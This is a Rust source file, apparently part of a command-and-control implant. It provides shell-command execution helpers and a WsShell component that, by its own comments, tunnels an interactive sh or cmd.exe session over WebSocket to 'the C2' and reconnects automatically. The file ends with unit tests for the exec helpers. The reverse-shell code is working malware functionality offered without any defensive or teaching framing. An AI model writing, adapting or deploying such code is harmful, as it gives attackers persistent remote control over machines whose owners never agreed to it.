use std::process::{Command, Stdio};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::{Duration, Instant};
use tracing::{info, warn, error};

#[derive(Debug, Clone)]
pub struct CommandResult {
    pub stdout: String,
    pub stderr: String,
    pub exit_code: i32,
    pub duration_ms: u64,
    pub truncated: bool,
}

const MAX_OUTPUT_LEN: usize = 1_048_576; // 1MB

/// Execute a shell command and capture output.
/// Truncates output beyond MAX_OUTPUT_LEN to avoid arena saturation.
pub fn execute_command(cmd: &str) -> CommandResult {
    let start = Instant::now();
    let output = Command::new("sh")
        .args(["-c", cmd])
        .output();

    let duration_ms = start.elapsed().as_millis() as u64;

    match output {
        Ok(out) => {
            let mut stdout = String::from_utf8_lossy(&out.stdout).to_string();
            let mut stderr = String::from_utf8_lossy(&out.stderr).to_string();
            let exit_code = out.status.code().unwrap_or(-1);
            let mut truncated = false;

            if stdout.len() > MAX_OUTPUT_LEN {
                stdout.truncate(MAX_OUTPUT_LEN);
                stdout.push_str("\n--- TRUNCATED ---");
                truncated = true;
            }
            if stderr.len() > MAX_OUTPUT_LEN {
                stderr.truncate(MAX_OUTPUT_LEN);
                stderr.push_str("\n--- TRUNCATED ---");
                truncated = true;
            }

            CommandResult { stdout, stderr, exit_code, duration_ms, truncated }
        }
        Err(e) => CommandResult {
            stdout: String::new(),
            stderr: format!("Failed to execute: {}", e),
            exit_code: -1,
            duration_ms,
            truncated: false,
        },
    }
}

/// Execute a command with a timeout. Kills the process if it exceeds the limit.
pub fn execute_command_with_timeout(cmd: &str, timeout_secs: u64) -> CommandResult {
    let start = Instant::now();
    let timeout = Duration::from_secs(timeout_secs);

    let mut child = match Command::new("sh")
        .args(["-c", cmd])
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
    {
        Ok(c) => c,
        Err(e) => return CommandResult {
            stdout: String::new(),
            stderr: format!("Failed to spawn: {}", e),
            exit_code: -1,
            duration_ms: start.elapsed().as_millis() as u64,
            truncated: false,
        },
    };

    let status = loop {
        match child.try_wait() {
            Ok(Some(status)) => break status,
            Ok(None) => {
                if start.elapsed() > timeout {
                    let _ = child.kill();
                    let _ = child.wait();
                    let elapsed = start.elapsed().as_millis() as u64;
                    return CommandResult {
                        stdout: String::new(),
                        stderr: format!("TIMEOUT after {}s", timeout_secs),
                        exit_code: -1,
                        duration_ms: elapsed,
                        truncated: false,
                    };
                }
                std::thread::sleep(Duration::from_millis(50));
            }
            Err(_) => {
                let _ = child.kill();
                let _ = child.wait();
                return CommandResult {
                    stdout: String::new(),
                    stderr: "Process error".into(),
                    exit_code: -1,
                    duration_ms: start.elapsed().as_millis() as u64,
                    truncated: false,
                };
            }
        }
    };

    let duration_ms = start.elapsed().as_millis() as u64;
    let mut stdout = String::new();
    let mut stderr = String::new();
    let mut truncated = false;

    if let Some(out_reader) = child.stdout.take() {
        use std::io::Read;
        let mut buf = String::new();
        if let Ok(_) = std::io::BufReader::new(out_reader).read_to_string(&mut buf) {
            if buf.len() > MAX_OUTPUT_LEN {
                stdout = buf.chars().take(MAX_OUTPUT_LEN).collect();
                stdout.push_str("\n--- TRUNCATED ---");
                truncated = true;
            } else {
                stdout = buf;
            }
        }
    }
    if let Some(err_reader) = child.stderr.take() {
        use std::io::Read;
        let mut buf = String::new();
        if let Ok(_) = std::io::BufReader::new(err_reader).read_to_string(&mut buf) {
            if buf.len() > MAX_OUTPUT_LEN {
                stderr = buf.chars().take(MAX_OUTPUT_LEN).collect();
                stderr.push_str("\n--- TRUNCATED ---");
                truncated = true;
            } else {
                stderr = buf;
            }
        }
    }

    CommandResult {
        stdout,
        stderr,
        exit_code: status.code().unwrap_or(-1),
        duration_ms,
        truncated,
    }
}

/// Track command execution statistics for an agent session.
#[derive(Debug, Clone)]
pub struct ExecSession {
    pub total_commands: u64,
    pub total_duration_ms: u64,
    pub failed_commands: u64,
    pub last_command: Option<String>,
    pub last_result: Option<CommandResult>,
}

impl ExecSession {
    pub fn new() -> Self {
        Self {
            total_commands: 0,
            total_duration_ms: 0,
            failed_commands: 0,
            last_command: None,
            last_result: None,
        }
    }

    pub fn run(&mut self, cmd: &str) -> CommandResult {
        let timeout = std::env::var("HIVE_EXEC_TIMEOUT")
            .ok()
            .and_then(|s| s.parse().ok())
            .unwrap_or(30u64);

        let result = execute_command_with_timeout(cmd, timeout);
        self.total_commands += 1;
        self.total_duration_ms += result.duration_ms;
        if result.exit_code != 0 {
            self.failed_commands += 1;
        }
        self.last_command = Some(cmd.to_string());
        self.last_result = Some(result.clone());

        info!("EXEC: cmd={} exit={} duration={}ms", cmd, result.exit_code, result.duration_ms);
        result
    }
}

impl Default for ExecSession {
    fn default() -> Self {
        Self::new()
    }
}

// ── Interactive WebSocket shell ──────────────────────────────────────────────

const WS_PING_INTERVAL: Duration = Duration::from_secs(15);
const WS_RECONNECT_DELAY: Duration = Duration::from_millis(3000);


/// A bidirectional shell tunnel over WebSocket.
///
/// Spawns `sh` (Linux) or `cmd.exe` (Windows), then relays stdin/stdout/stderr
/// over a WebSocket connection to the C2. The shell runs in its own thread with
/// a dedicated tokio runtime so it doesn't block the agent's main loop.
pub struct WsShell {
    running: Arc<AtomicBool>,
    handle: Option<thread::JoinHandle<()>>,
}

impl WsShell {
    /// Start an interactive shell session.
    ///
    /// `url` must be a `wss://` or `ws://` endpoint the C2 is listening on.
    pub fn start(url: &str) -> Self {
        let running = Arc::new(AtomicBool::new(true));
        let running_clone = running.clone();
        let url_owned = url.to_string();
        let url_for_thread = url_owned.clone();

        let handle = thread::Builder::new()
            .name("ws-shell".into())
            .spawn(move || {
                let rt = match tokio::runtime::Runtime::new() {
                    Ok(r) => r,
                    Err(e) => {
                        error!("WS-SHELL: failed to create runtime: {}", e);
                        return;
                    }
                };
                rt.block_on(async move {
                    while running_clone.load(Ordering::Relaxed) {
                        run_shell_session(&url_for_thread, &running_clone).await;
                        if running_clone.load(Ordering::Relaxed) {
                            tokio::time::sleep(WS_RECONNECT_DELAY).await;
                        }
                    }
                });
            })
            .ok();

        info!("WS-SHELL: started interactive shell -> {}", url_owned);
        Self { running, handle }
    }

    /// Stop the shell session and kill the child process.
    pub fn stop(&mut self) {
        self.running.store(false, Ordering::Relaxed);
        if let Some(h) = self.handle.take() {
            let _ = h.join();
        }
        info!("WS-SHELL: stopped");
    }

    /// Check if the shell is still running.
    pub fn is_running(&self) -> bool {
        self.running.load(Ordering::Relaxed)
    }
}

impl Drop for WsShell {
    fn drop(&mut self) {
        self.stop();
    }
}

async fn run_shell_session(url: &str, running: &AtomicBool) {
    use tokio_tungstenite::connect_async;
    use tokio_tungstenite::tungstenite::Message;
    use futures::{SinkExt, StreamExt};
    use tokio::io::{AsyncWriteExt, AsyncReadExt};
    use tokio::process::Command as TokioCommand;

    let ws = match connect_async(url).await {
        Ok((ws, _)) => ws,
        Err(e) => { warn!("WS-SHELL: connect failed: {}", e); return; }
    };
    info!("WS-SHELL: connected");
    let ws = Arc::new(tokio::sync::Mutex::new(ws));

    let shell_cmd = if cfg!(target_os = "windows") { "cmd.exe" } else { "/bin/sh" };

    let mut child = match TokioCommand::new(shell_cmd)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
    {
        Ok(c) => c,
        Err(e) => { warn!("WS-SHELL: spawn failed: {}", e); return; }
    };

    let mut stdin = child.stdin.take().unwrap();
    let stdout = child.stdout.take().unwrap();
    let stderr = child.stderr.take().unwrap();

    let running_in = Arc::new(AtomicBool::new(true));

    // Recv task: WS → process stdin
    let r1 = running_in.clone();
    let ws1 = ws.clone();
    let recv_task = tokio::spawn(async move {
        loop {
            let msg = {
                let mut locked = ws1.lock().await;
                tokio::time::timeout(Duration::from_secs(1), locked.next()).await
            };
            match msg {
                Ok(Some(Ok(Message::Text(t)))) => {
                    let _ = stdin.write_all(t.as_bytes()).await;
                    let _ = stdin.write_all(b"\n").await;
                    let _ = stdin.flush().await;
                }
                Ok(Some(Ok(Message::Binary(d)))) => {
                    let _ = stdin.write_all(&d).await;
                    let _ = stdin.flush().await;
                }
                Ok(Some(Ok(Message::Close(_)))) | Ok(None) => break,
                Ok(Some(Err(e))) => { warn!("WS-SHELL: recv: {}", e); break; }
                _ => { if !r1.load(Ordering::Relaxed) { break; } }
            }
        }
    });

    // stdout task: process stdout → WS
    let r2 = running_in.clone();
    let ws2 = ws.clone();
    let out_task = tokio::spawn(async move {
        let mut reader = tokio::io::BufReader::new(stdout);
        let mut buf = vec![0u8; 8192];
        loop {
            match tokio::time::timeout(Duration::from_millis(500), reader.read(&mut buf)).await {
                Ok(Ok(0)) => break,
                Ok(Ok(n)) => {
                    let mut locked = ws2.lock().await;
                    let _ = locked.send(Message::Text(
                        String::from_utf8_lossy(&buf[..n]).to_string()
                    )).await;
                }
                Ok(Err(e)) => { warn!("WS-SHELL: stdout: {}", e); break; }
                Err(_) => { if !r2.load(Ordering::Relaxed) { break; } }
            }
        }
    });

    // stderr task: process stderr → WS
    let r3 = running_in.clone();
    let ws3 = ws.clone();
    let err_task = tokio::spawn(async move {
        let mut reader = tokio::io::BufReader::new(stderr);
        let mut buf = vec![0u8; 4096];
        loop {
            match tokio::time::timeout(Duration::from_millis(500), reader.read(&mut buf)).await {
                Ok(Ok(0)) => break,
                Ok(Ok(n)) => {
                    let mut locked = ws3.lock().await;
                    let _ = locked.send(Message::Text(
                        String::from_utf8_lossy(&buf[..n]).to_string()
                    )).await;
                }
                Ok(Err(e)) => { warn!("WS-SHELL: stderr: {}", e); break; }
                Err(_) => { if !r3.load(Ordering::Relaxed) { break; } }
            }
        }
    });

    // Ping task
    let r4 = running_in.clone();
    let ws4 = ws.clone();
    let ping_task = tokio::spawn(async move {
        let mut interval = tokio::time::interval(WS_PING_INTERVAL);
        loop {
            interval.tick().await;
            if !r4.load(Ordering::Relaxed) { break; }
            let mut locked = ws4.lock().await;
            if locked.send(Message::Ping(vec![])).await.is_err() { break; }
        }
    });

    // Wait for shutdown signal
    while running.load(Ordering::Relaxed) {
        tokio::time::sleep(Duration::from_millis(200)).await;
    }

    running_in.store(false, Ordering::Relaxed);
    let _ = child.kill().await;
    let _ = child.wait().await;
    recv_task.abort();
    out_task.abort();
    err_task.abort();
    ping_task.abort();

    info!("WS-SHELL: session ended");
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_execute_simple() {
        let r = execute_command("echo hello");
        assert_eq!(r.stdout.trim(), "hello");
        assert_eq!(r.exit_code, 0);
    }

    #[test]
    fn test_execute_with_stderr() {
        let r = execute_command("echo stderr >&2 && echo stdout");
        assert_eq!(r.stdout.trim(), "stdout");
        assert_eq!(r.exit_code, 0);
    }

    #[test]
    fn test_execute_nonzero_exit() {
        let r = execute_command("false");
        assert_ne!(r.exit_code, 0);
    }

    #[test]
    fn test_execute_timeout() {
        let r = execute_command_with_timeout("sleep 10", 1);
        assert!(r.stderr.contains("TIMEOUT"));
        assert_eq!(r.exit_code, -1);
    }

    #[test]
    fn test_execute_long_output_truncated() {
        let r = execute_command("yes | head -c 2000000");
        assert!(r.truncated || r.stdout.len() <= MAX_OUTPUT_LEN + 100);
    }

    #[test]
    fn test_exec_session() {
        let mut s = ExecSession::new();
        assert_eq!(s.total_commands, 0);

        let r = s.run("echo ok");
        assert_eq!(r.exit_code, 0);
        assert_eq!(s.total_commands, 1);
        assert!(s.total_duration_ms > 0);
        assert_eq!(s.failed_commands, 0);
    }

    #[test]
    fn test_exec_session_tracks_failures() {
        let mut s = ExecSession::new();
        s.run("echo ok");
        s.run("false");
        assert_eq!(s.total_commands, 2);
        assert_eq!(s.failed_commands, 1);
    }

    #[test]
    fn test_execute_pipeline() {
        let r = execute_command("echo 'foo bar baz' | wc -w");
        assert_eq!(r.stdout.trim(), "3");
    }

    #[test]
    fn test_execute_env_var() {
        let r = execute_command("echo $SHELL");
        assert!(!r.stdout.trim().is_empty() || r.exit_code == 0);
    }

    #[test]
    fn test_execute_invalid_command() {
        let r = execute_command("nonexistent_command_xyz_123");
        assert_ne!(r.exit_code, 0);
    }
}
